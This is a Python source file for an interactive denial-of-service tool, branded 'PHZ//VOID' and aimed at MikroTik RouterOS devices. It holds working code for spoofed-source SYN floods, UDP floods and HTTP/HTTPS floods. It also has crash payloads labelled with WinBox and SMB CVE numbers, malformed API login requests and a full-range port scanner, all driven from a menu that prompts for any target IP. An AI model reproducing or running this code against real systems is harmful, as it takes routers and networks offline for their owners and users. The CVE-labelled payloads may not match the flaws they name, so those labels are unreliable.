#!/usr/bin/env python3
# PHZ//VOID - Module 4: Denial of Service (DoS)
# Advanced DoS Attack Module for MikroTik RouterOS
# VERSION: FINAL 4.0 - PRODUCTION READY

import socket
import ssl
import time
import random
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import List, Dict, Optional
from datetime import datetime
import sys
import os

sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from core.utils import HackerStyle, Logger

# Optional Scapy for advanced attacks
SCAPY_AVAILABLE = False
try:
    from scapy.all import IP, TCP, send, RandIP, RandShort
    SCAPY_AVAILABLE = True
except ImportError:
    pass


class DoSAttackModule:
    """
    Denial of Service Attack Module for MikroTik RouterOS
    Version: 4.0 - Production Ready
    Features: Scapy support, Full port scan, Network scanner, Multi-threaded
    """

    def __init__(self, target: str):
        self.target = target
        self.logger = Logger("DoS")
        self.running = False
        self._lock = threading.Lock()
        self.stats = {
            'packets_sent': 0,
            'bytes_sent': 0,
            'start_time': None,
            'end_time': None
        }

    def _print_stats(self):
        """Print attack statistics"""
        if not self.stats['start_time']:
            return

        duration = (self.stats['end_time'] - self.stats['start_time']).total_seconds() if self.stats['end_time'] else 0

        print("\n" + "═" * 65)
        print(f"     {HackerStyle.RED}DoS ATTACK STATISTICS{HackerStyle.RESET}")
        print("═" * 65)

        print(f" Target       : {self.target}")
        print(f" Duration     : {duration:.1f} seconds")
        print(f" Packets Sent : {self.stats['packets_sent']:,}")
        print(f" Data Sent    : {self.stats['bytes_sent'] / 1024:.2f} KB")

        if duration > 0 and self.stats['packets_sent'] > 0:
            print(f" Packet Rate  : {self.stats['packets_sent'] / duration:.1f} pps")
            print(f" Bandwidth    : {(self.stats['bytes_sent'] * 8 / duration) / 1000:.2f} Kbps")
        else:
            print(f" Packet Rate  : 0 pps (attack may have failed)")

        print("═" * 65 + "\n")

    # ====================== ADVANCED SYN FLOOD (WITH SCAPY) ======================

    def syn_flood_advanced(self, port: int = 80, duration: int = 30, threads: int = 200):
        """
        REAL SYN Flood using Scapy - Raw packet injection
        Requires: pip install scapy & Npcap (Windows)
        """
        if not SCAPY_AVAILABLE:
            HackerStyle.error("Scapy not installed! Falling back to basic mode...")
            HackerStyle.info("Install with: pip install scapy")
            self.syn_flood_basic(port, duration, threads)
            return

        HackerStyle.warning(f"🚀 ADVANCED SYN Flood → {self.target}:{port}")
        HackerStyle.info(f"   Duration: {duration}s | Threads: {threads}")
        HackerStyle.warning("   ⚡ Requires administrator/root privileges!")

        self.running = True
        self.stats = {'packets_sent': 0, 'bytes_sent': 0, 'start_time': datetime.now(), 'end_time': None}
        end_time = time.time() + duration

        def flood_worker():
            ip = IP(dst=self.target)
            while self.running and time.time() < end_time:
                try:
                    ip.src = RandIP()
                    tcp = TCP(sport=RandShort(), dport=port, flags='S')
                    send(ip/tcp, verbose=False)
                    with self._lock:
                        self.stats['packets_sent'] += 1
                        self.stats['bytes_sent'] += 54
                except:
                    pass

        with ThreadPoolExecutor(max_workers=min(threads, 500)) as executor:
            for _ in range(min(threads, 500)):
                executor.submit(flood_worker)

            start = time.time()
            while self.running and time.time() < end_time:
                elapsed = int(time.time() - start)
                print(f"\r   Progress: {elapsed}/{duration}s | Packets: {self.stats['packets_sent']:,}    ", end="")
                time.sleep(1)

        self.running = False
        self.stats['end_time'] = datetime.now()
        self._print_stats()

    def syn_flood_basic(self, port: int = 80, duration: int = 30, threads: int = 300):
        """SYN Flood - Basic version (no root required, lower packet rate)"""
        HackerStyle.warning(f"🔵 BASIC SYN Flood → {self.target}:{port}")
        HackerStyle.info(f"   Duration: {duration}s | Threads: {threads}")

        self.running = True
        self.stats = {'packets_sent': 0, 'bytes_sent': 0, 'start_time': datetime.now(), 'end_time': None}
        end_time = time.time() + duration

        def flood_worker():
            while self.running and time.time() < end_time:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(0.5)
                    sock.connect((self.target, port))
                    sock.close()
                    with self._lock:
                        self.stats['packets_sent'] += 1
                        self.stats['bytes_sent'] += 60
                except:
                    pass

        with ThreadPoolExecutor(max_workers=threads) as executor:
            for _ in range(threads):
                executor.submit(flood_worker)

            start = time.time()
            while self.running and time.time() < end_time:
                elapsed = int(time.time() - start)
                print(f"\r   Progress: {elapsed}/{duration}s | Packets: {self.stats['packets_sent']:,}    ", end="")
                time.sleep(1)

        self.running = False
        self.stats['end_time'] = datetime.now()
        self._print_stats()

    # ====================== UDP FLOOD ======================

    def udp_flood(self, port: int = 53, duration: int = 30, packet_size: int = 1400, threads: int = 200):
        """UDP Flood Attack - Large UDP packets"""
        HackerStyle.warning(f"🚀 UDP Flood → {self.target}:{port}")
        HackerStyle.info(f"   Duration: {duration}s | Packet size: {packet_size} | Threads: {threads}")

        self.running = True
        self.stats = {'packets_sent': 0, 'bytes_sent': 0, 'start_time': datetime.now(), 'end_time': None}
        end_time = time.time() + duration
        payload = random.randbytes(packet_size)

        def flood_worker():
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            while self.running and time.time() < end_time:
                try:
                    sock.sendto(payload, (self.target, port))
                    with self._lock:
                        self.stats['packets_sent'] += 1
                        self.stats['bytes_sent'] += packet_size
                except:
                    pass

        with ThreadPoolExecutor(max_workers=threads) as executor:
            for _ in range(threads):
                executor.submit(flood_worker)

            start = time.time()
            while self.running and time.time() < end_time:
                elapsed = int(time.time() - start)
                print(f"\r   Progress: {elapsed}/{duration}s | Packets: {self.stats['packets_sent']:,}", end="")
                time.sleep(1)

        self.running = False
        self.stats['end_time'] = datetime.now()
        self._print_stats()

    # ====================== HTTP/HTTPS FLOOD ======================

    def http_flood(self, port: int = 80, use_ssl: bool = False, duration: int = 30, threads: int = 150):
        """HTTP / HTTPS Flood - Web interface attack"""
        proto = "HTTPS" if use_ssl else "HTTP"
        HackerStyle.warning(f"🚀 {proto} Flood → {self.target}:{port}")
        HackerStyle.info(f"   Duration: {duration}s | Threads: {threads}")

        self.running = True
        self.stats = {'packets_sent': 0, 'bytes_sent': 0, 'start_time': datetime.now(), 'end_time': None}
        end_time = time.time() + duration
        request = f"GET / HTTP/1.1\r\nHost: {self.target}\r\nConnection: close\r\n\r\n".encode()

        def flood_worker():
            while self.running and time.time() < end_time:
                try:
                    if use_ssl:
                        context = ssl.create_default_context()
                        context.check_hostname = False
                        context.verify_mode = ssl.CERT_NONE
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        sock = context.wrap_socket(sock, server_hostname=self.target)
                    else:
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

                    sock.settimeout(3)
                    sock.connect((self.target, port))
                    sock.send(request)
                    sock.close()

                    with self._lock:
                        self.stats['packets_sent'] += 1
                        self.stats['bytes_sent'] += len(request)
                except:
                    pass

        with ThreadPoolExecutor(max_workers=threads) as executor:
            for _ in range(threads):
                executor.submit(flood_worker)

            start = time.time()
            while self.running and time.time() < end_time:
                elapsed = int(time.time() - start)
                print(f"\r   Progress: {elapsed}/{duration}s | Requests: {self.stats['packets_sent']:,}", end="")
                time.sleep(1)

        self.running = False
        self.stats['end_time'] = datetime.now()
        self._print_stats()

    # ====================== PROTOCOL SPECIFIC CRASH (GENERIC HELPER) ======================

    def _generic_crash(self, port: int, duration: int, name: str, payload: bytes, use_ssl: bool = False):
        """Generic crash helper - reusable for all crash attacks"""
        HackerStyle.warning(f"🚀 {name} Crash Attack → {self.target}:{port}")

        self.stats = {'packets_sent': 0, 'bytes_sent': 0, 'start_time': datetime.now(), 'end_time': None}
        end_time = time.time() + duration

        while time.time() < end_time:
            try:
                if use_ssl:
                    context = ssl.create_default_context()
                    context.check_hostname = False
                    context.verify_mode = ssl.CERT_NONE
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock = context.wrap_socket(sock, server_hostname=self.target)
                else:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

                sock.settimeout(2)
                sock.connect((self.target, port))
                sock.send(payload)
                sock.close()

                self.stats['packets_sent'] += 1
                self.stats['bytes_sent'] += len(payload)
            except:
                pass
            time.sleep(0.3)

        self.stats['end_time'] = datetime.now()
        self._print_stats()

    def winbox_crash(self, port: int = 8291, duration: int = 20):
        """WinBox Crash / Resource Exhaustion (CVE-2018-1157)"""
        payload = b'\x00\x00\x00\x00' * 50
        self._generic_crash(port, duration, "WinBox", payload)

    def smb_crash(self, port: int = 445, duration: int = 20):
        """SMB Service Crash (CVE-2024-27686)"""
        payload = b'\x00\x00\x00\x90\xffSMB' + b'A' * 300
        self._generic_crash(port, duration, "SMB", payload)

    def api_crash(self, port: int = 8728, use_ssl: bool = False, duration: int = 20):
        """API Service Crash (Malformed requests)"""
        payload = b'/login\n=name=' + b'A' * 2048 + b'\n=password=' + b'B' * 2048
        self._generic_crash(port, duration, "API", payload, use_ssl=use_ssl)

    # ====================== PORT SCANNER (FULL 1-65535) ======================

    def scan_ports(self, full_scan: bool = False) -> List[int]:
        """
        Scan open ports - Full scan (1-65535) or Quick scan (common ports)
        """
        open_ports = []

        if full_scan:
            HackerStyle.info(f"🔍 FULL SCAN: Scanning all 65535 ports on {self.target}")
            HackerStyle.warning("   ⏰ This may take 5-15 minutes...")
            ports = range(1, 65536)
            timeout = 0.4
            workers = 300
        else:
            HackerStyle.info(f"🔍 QUICK SCAN: Scanning common ports on {self.target}")
            ports = [21, 22, 23, 53, 80, 443, 445, 8080, 8291, 8728, 8729, 8081, 990, 2000, 5678]
            timeout = 1.0
            workers = 50

        def check_port(port: int):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(timeout)
                result = sock.connect_ex((self.target, port))
                sock.close()
                return port if result == 0 else None
            except:
                return None

        with ThreadPoolExecutor(max_workers=workers) as executor:
            futures = [executor.submit(check_port, p) for p in ports]

            for i, future in enumerate(as_completed(futures)):
                port = future.result()
                if port:
                    open_ports.append(port)
                    HackerStyle.success(f"   ✅ Port {port} is OPEN")

                # Progress update for full scan
                if full_scan and i % 1000 == 0:
                    print(f"\r   📊 Progress: {i:,}/{len(ports):,} ports | Open: {len(open_ports)}", end="")

        print()
        HackerStyle.info(f"📊 Scan complete: {len(open_ports)} open ports found")
        if open_ports:
            HackerStyle.info(f"   Open ports: {', '.join(map(str, sorted(open_ports)))}")

        return sorted(open_ports)

    # ====================== NETWORK SCANNER INTEGRATION ======================

    def scan_network(self):
        """Scan network for active hosts"""
        try:
            from core.network_scanner import NetworkScanner
            scanner = NetworkScanner()

            print("\n   [1] Quick ARP scan (instant)")
            print("   [2] Full ping sweep (accurate, 30-60s)")
            print("   [3] Fast scan (ARP + Gateway)")

            subchoice = input("\n   [?] Choose: ")

            if subchoice == "1":
                hosts = scanner.scan("arp")
            elif subchoice == "2":
                hosts = scanner.ping_sweep()
            else:
                hosts = scanner.fast_scan()

            scanner.print_report(hosts)

        except ImportError:
            HackerStyle.error("NetworkScanner module not found!")
            HackerStyle.info("Run: python core/network_scanner.py separately")

    # ====================== MAIN MENU ======================

    def menu(self):
        """Interactive DoS Menu"""
        while True:
            print("\n" + "═" * 70)
            print(f"     {HackerStyle.RED}🔥 DoS ATTACK MODULE - {self.target}{HackerStyle.RESET}")
            print("═" * 70)

            # Status indicators
            if SCAPY_AVAILABLE:
                print(f"   {HackerStyle.GREEN}✓ Scapy: Available (Advanced SYN Flood){HackerStyle.RESET}")
            else:
                print(f"   {HackerStyle.YELLOW}⚠ Scapy: Not installed (Basic mode only){HackerStyle.RESET}")
                print(f"     Install: pip install scapy")

            print("\n   ┌─────────────────────────────────────────────────────────────┐")
            print("   │ 1. SYN Flood (ADVANCED - Scapy)                             │")
            print("   │ 2. SYN Flood (BASIC - No Scapy)                             │")
            print("   │ 3. UDP Flood                                                │")
            print("   │ 4. HTTP/HTTPS Flood                                         │")
            print("   │ 5. WinBox Crash (CVE-2018-1157)                             │")
            print("   │ 6. SMB Crash (CVE-2024-27686)                               │")
            print("   │ 7. API Crash                                                │")
            print("   │ 8. Scan Open Ports                                          │")
            print("   │ 9. Scan Network (Find Active IPs)                          │")
            print("   │ 0. Exit                                                     │")
            print("   └─────────────────────────────────────────────────────────────┘")

            choice = input(f"\n{HackerStyle.CYAN}┌─[PHZ//VOID:DOS]\n└─[?] Select: {HackerStyle.RESET}").strip()

            # Attack 1: Advanced SYN Flood
            if choice == "1":
                if not SCAPY_AVAILABLE:
                    HackerStyle.error("Scapy not installed! Use option 2 for basic SYN Flood.")
                    HackerStyle.info("Install with: pip install scapy")
                    continue
                port = int(input("[?] Target port (default 80): ") or 80)
                dur = int(input("[?] Duration (seconds, default 30): ") or 30)
                threads = int(input("[?] Threads (default 300): ") or 300)
                self.syn_flood_advanced(port, dur, threads)

            # Attack 2: Basic SYN Flood
            elif choice == "2":
                port = int(input("[?] Target port (default 80): ") or 80)
                dur = int(input("[?] Duration (seconds, default 30): ") or 30)
                threads = int(input("[?] Threads (default 300): ") or 300)
                self.syn_flood_basic(port, dur, threads)

            # Attack 3: UDP Flood
            elif choice == "3":
                port = int(input("[?] Target port (default 53): ") or 53)
                dur = int(input("[?] Duration (seconds, default 30): ") or 30)
                threads = int(input("[?] Threads (default 200): ") or 200)
                self.udp_flood(port, dur, 1400, threads)

            # Attack 4: HTTP/HTTPS Flood
            elif choice == "4":
                port = int(input("[?] Port (80 for HTTP, 443 for HTTPS): ") or 80)
                dur = int(input("[?] Duration (seconds, default 30): ") or 30)
                threads = int(input("[?] Threads (default 150): ") or 150)
                self.http_flood(port, use_ssl=(port == 443), duration=dur, threads=threads)

            # Attack 5: WinBox Crash
            elif choice == "5":
                dur = int(input("[?] Duration (seconds, default 20): ") or 20)
                self.winbox_crash(8291, dur)

            # Attack 6: SMB Crash
            elif choice == "6":
                dur = int(input("[?] Duration (seconds, default 20): ") or 20)
                self.smb_crash(445, dur)

            # Attack 7: API Crash
            elif choice == "7":
                port = int(input("[?] API port (8728 or 8729): ") or 8728)
                dur = int(input("[?] Duration (seconds, default 20): ") or 20)
                self.api_crash(port, use_ssl=(port == 8729), duration=dur)

            # Attack 8: Scan Ports
            elif choice == "8":
                print("\n   [1] Quick scan (common ports only)")
                print("   [2] Full scan (ALL 1-65535 ports - takes 5-15 minutes)")
                subchoice = input("\n   [?] Choose: ")
                self.scan_ports(full_scan=(subchoice == "2"))

            # Attack 9: Scan Network
            elif choice == "9":
                self.scan_network()

            # Exit
            elif choice == "0":
                HackerStyle.info("Exiting DoS module...")
                break

            else:
                HackerStyle.error("Invalid choice!")


# ====================== MAIN ======================
if __name__ == "__main__":
    HackerStyle.banner()

    print("\n" + "═" * 65)
    print(f"     {HackerStyle.RED}DoS ATTACK MODULE - FINAL VERSION 4.0{HackerStyle.RESET}")
    print("     Advanced Denial of Service for MikroTik RouterOS")
    print("═" * 65 + "\n")

    target = input(HackerStyle.CYAN + "[?] Target IP: " + HackerStyle.RESET).strip()

    if not target:
        HackerStyle.error("Target IP required!")
        sys.exit(1)

    dos = DoSAttackModule(target)
    dos.menu()